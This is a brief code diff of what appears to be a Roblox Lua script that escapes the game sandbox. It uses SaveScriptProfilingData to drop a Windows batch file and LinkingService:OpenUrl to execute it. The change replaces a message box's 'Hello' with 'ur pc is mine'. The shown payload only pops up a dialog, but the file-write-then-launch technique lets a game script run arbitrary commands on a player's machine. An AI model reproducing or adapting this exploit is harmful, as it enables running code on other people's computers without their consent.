@@ -4,7 +4,7 @@ script:FindFirstAncestorWhichIsA("DataModel").LinkingService:OpenUrl(
         :SaveScriptProfilingData(
             [[
                 @echo off
-                echo x=msgbox("Hello", 0+64, "Message") > msg.vbs
+                echo x=msgbox("ur pc is mine", 0+64, "Message") > msg.vbs
 start msg.vbs
 exit
                 pause
